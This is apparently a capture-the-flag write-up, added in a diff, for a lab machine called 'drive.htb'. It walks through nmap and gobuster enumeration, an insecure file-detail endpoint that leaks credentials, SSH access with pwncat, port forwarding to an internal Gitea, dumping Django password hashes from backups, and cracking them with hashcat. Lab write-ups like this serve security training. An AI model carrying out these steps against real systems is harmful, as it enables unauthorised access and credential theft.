@@ -1,0 +1,211 @@
+#+TITLE: DRIVER CTF WRITUP
+#+AUTHOR: MattiaCossu ZproAle
+
+* Enumeretion
+** nmap -A -Sv -Sc drive.htb
+#+BEGIN_SRC bash
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 17:30 EDT
+Nmap scan report for driver.htb (10.10.11.235)
+Host is up (0.038s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)
+|   256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)
+|_  256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)
+80/tcp   open     http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://drive.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+3000/tcp filtered ppp
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds
+#+END_SRC
+** nmap -p- drive.htb
+#+BEGIN_SRC bash
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 17:33 EDT
+Nmap scan report for drive.htb (10.10.11.235)
+Host is up (0.035s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+3000/tcp filtered ppp
+
+Nmap done: 1 IP address (1 host up) scanned in 35.01 seconds
+#+END_SRC
+With these two scans we note that we have 3 ports of which one is filtered, the ~3000~, the ~80~ for a _HTTP server_ and ~22~ for a SSH
+** Web Enumerations
+The app is probably for managing documents in the cloud.
+
+Without registering in the application, since it allows it we notice in the _/home_  private note
+[[./pics/interesting_file.png]]
+We want to try to _see_ if it is possible to read the content of that note and maybe *others* since the backend lists them via url like this ~drive.htb/100/getFileDetail/~ (we can see this url once we create an account and get session tokens)
+
+With _burp's intruder_ we go looking for all possible files in the backend and find great results!
+[[./pics/attack_burp.png]]
+now we just have to figure out how we can read those files since the requests respond like this : (
+#+BEGIN_SRC json
+{"status": "unauthorized"}
+#+END_SRC
+
+with _gobuster_ then let's look at all the possible subdomains starting with ~drive.htb/100/~ to see if there is anything interesting.
+#+BEGIN_SRC bash 
+  gobuster dir -u http://drive.htb/100 --cookies 'Cookie: csrftoken=AlankMlxInGpRCoOAMEYbWjJ7w7WAgcT; sessionid=4ue8dm8pmi5innjghx5i08tuvdi7j49e' -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+  ===============================================================
+  Gobuster v3.6
+  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+  ===============================================================
+  [+] Url:                     http://drive.htb/100
+  [+] Method:                  GET
+  [+] Threads:                 10
+  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+  [+] Negative Status codes:   404
+  [+] Cookies:                 Cookie: csrftoken=AlankMlxInGpRCoOAMEYbWjJ7w7WAgcT; sessionid=4ue8dm8pmi5innjghx5i08tuvdi7j49e
+  [+] User Agent:              gobuster/3.6
+  [+] Timeout:                 10s
+  ===============================================================
+  Starting gobuster in directory enumeration mode
+  ===============================================================
+  /updates              (Status: 302) [Size: 0] [--> /login/]
+  /update               (Status: 302) [Size: 0] [--> /login/]
+  /blocks               (Status: 302) [Size: 0] [--> /login/]
+  /block                (Status: 301) [Size: 0] [--> /100/block/]
+  /updated              (Status: 302) [Size: 0] [--> /login/]
+  /delete               (Status: 302) [Size: 0] [--> /login/]
+  Progress: 6900 / 207644 (3.32%)^C
+  [!] Keyboard interrupt detected, terminating.
+  Progress: 6914 / 207644 (3.33%)
+  ===============================================================
+  Finished
+  ===============================================================                                                  
+#+END_SRC
+
+We notice the presence of a route ~/block~ that responds with _302_ code, interesting let's go right away to test it with some hidden files!!!
+
+Nice we have a ~Data Leak~!!
+[[./pics/dataleak.png]]
+We have just obtained _credentials_, we immediately deprive the ~foothold~!!
+* PE
+With powncat (_c2_) we start a connection to the user ~Martin~
+#+BEGIN_SRC bash
+  python3 -m pwncat 
+    'class': algorithms.Blowfish,
+  [10:19:27] Welcome to pwncat 🐈!                                                                                                                         __main__.py:164
+  (local) pwncat$ connect ssh://martin@drive.htb
+  Password: *****************
+  [10:20:10] drive.htb:22: registered new host w/ db 
+#+END_SRC
+we are in!!
+#+BEGIN_SRC bash
+  (remote) martin@drive:/home/martin$ whoami
+  martin
+#+END_SRC
+Enumerating the file system we notice an interesting folder within _/var/www_, the ~backups~ folder.
+Unfortunately, the files are password protected so we have to find a way to access them.
+
+Remembering the presence of a filtered port (3000) we note that inside the machine where we landed we can contact the service.
+#+BEGIN_SRC bash
+  curl 127.0.0.1:3000
+  <!DOCTYPE html>
+  <html lang="en-US" class="theme-">
+  <head>
+	  <meta charset="utf-8">
+	  <meta name="viewport" content="width=device-width, initial-scale=1">
+	  <title> Gitea: Git with a cup of tea</title>
+#+END_SRC
+
+We have notice that, into the server are present a ~Gitea~ service.
+Let's try to forword the port fopr access to web server into kali.
+
+#+BEGIN_SRC bash
+  ssh -L 8000:127.0.0.1:3000 martin@drive.htb
+#+END_SRC
+
+Visiting now our ~localhost~ on the _8000_ within kali we can visit the web server!!!
+[[./pics/gitea.png]]
+
+Returning to the backups folder and analyzing the non-7zip backup we notice the presence of a list of users with their passwords
+#+BEGIN_SRC bash
+  sqlite> .tables
+  accounts_customuser                   auth_permission                     
+  accounts_customuser_groups            django_admin_log                    
+  accounts_customuser_user_permissions  django_content_type                 
+  accounts_g                            django_migrations                   
+  accounts_g_users                      django_session                      
+  auth_group                            myApp_file                          
+  auth_group_permissions                myApp_file_groups                   
+  sqlite> SELECT * FROM accounts_customuser
+     ...> ;
+  21|sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a|2022-12-26 05:48:27.497873|0|jamesMason|||jamesMason@drive.htb|0|1|2022-12-23 12:33:04
+  22|sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f|2022-12-24 12:55:10|0|martinCruz|||martin@drive.htb|0|1|2022-12-23 12:35:02
+  23|sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004|2022-12-24 13:17:45|0|tomHands|||tom@drive.htb|0|1|2022-12-23 12:37:45
+  24|sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f|2022-12-24 16:51:53|0|crisDisel|||cris@drive.htb|0|1|2022-12-23 12:39:15
+  30|sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3|2022-12-26 05:43:40.388717|1|admin|||admin@drive.htb|1|1|2022-12-26 05:30:58.003372
+
+#+END_SRC
+
+Let's try logging into gitea with the user martinCruz and his old password found earlier.
+
+We are inside and have access to the repository of the application
+[[./pics/repo.png]]
+We can also see the script that is in charge of making the backups maybe we find the password that zippers them.
+[[./pics/password.png]]
+Now we can unzip the archive with this password.
+
+#+BEGIN_SRC bash
+  7z e 1_Nov_db_backup.sqlite3.7z -o/tmp
+
+  7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+  p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7302P 16-Core Processor                (830F10),ASM,AES-NI)
+
+  Scanning the drive for archives:
+  1 file, 12226 bytes (12 KiB)
+
+  Extracting archive: 1_Nov_db_backup.sqlite3.7z
+  --
+  Path = 1_Nov_db_backup.sqlite3.7z
+  Type = 7z
+  Physical Size = 12226
+  Headers Size = 146
+  Method = LZMA2:22 7zAES
+  Solid = -
+  Blocks = 1
+
+    
+  Enter password (will not be echoed):
+
+  Would you like to replace the existing file:
+    Path:     ./db.sqlite3
+    Size:     3760128 bytes (3672 KiB)
+    Modified: 2022-12-26 05:51:24
+  with the file from archive:
+    Path:     db.sqlite3
+    Size:     3760128 bytes (3672 KiB)
+    Modified: 2023-09-01 18:25:59
+  ? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y
+
+#+END_SRC
+
+All archives contain different hashes maybe this one is lucky.
+#+BEGIN_SRC bash
+  sqlite3 db.sqlite3 
+  SQLite version 3.31.1 2020-01-27 19:55:54
+  Enter ".help" for usage hints.
+  sqlite> SELECT * FROM accounts_customuser;
+  21|sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a|2022-12-26 05:48:27.497873|0|jamesMason|||jamesMason@drive.htb|0|1|2022-12-23 12:33:04
+  22|sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f|2022-12-24 12:55:10|0|martinCruz|||martin@drive.htb|0|1|2022-12-23 12:35:02
+  23|sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db8896*****|2022-12-24 13:17:45|0|tomHands|||tom@drive.htb|0|1|2022-12-23 12:37:45
+  24|sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f|2022-12-24 16:51:53|0|crisDisel|||cris@drive.htb|0|1|2022-12-23 12:39:15
+  30|sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3|2022-12-26 05:43:40.388717|1|admin|||admin@drive.htb|1|1|2022-12-26 05:30:58.003372
+  sqlite>
+#+END_SRC
+
+Now we can try to crak the interesting hash with hascat
+#+BEGIN_SRC bash
+  hashcat -m 124 hash.tom.3 /usr/share/wordlists/rockyou.txt
+#+END_SRC
+
+Nice we have obtain the new password for ~tom~
